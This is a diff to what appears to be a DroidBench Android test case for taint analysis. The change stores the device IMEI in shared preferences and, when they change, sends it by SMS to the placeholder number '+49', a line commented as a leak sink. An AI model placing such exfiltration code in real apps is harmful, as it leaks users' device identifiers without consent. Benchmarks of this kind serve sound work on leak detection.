@@ -1,12 +1,10 @@
 package edu.mit.event_context_shared_pref_listener;
 
-import edu.mit.event_context_shared_pref_listener.R;
 import android.app.Activity;
+import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
-import android.content.SharedPreferences;
 
 /**
  * @testcase_name Event-Context-Shared-Pref-Listener
@@ -33,11 +31,12 @@ public class MainActivity extends Activity implements SharedPreferences.OnShared
         
         SharedPreferences.Editor editor = settings.edit();
         editor.putString("imei", imei);
-        
+        editor.commit();
     }
 
     public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
         String imei = sharedPreferences.getString(key, "");
-        Log.i("DroidBench", imei);
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
     }
 }
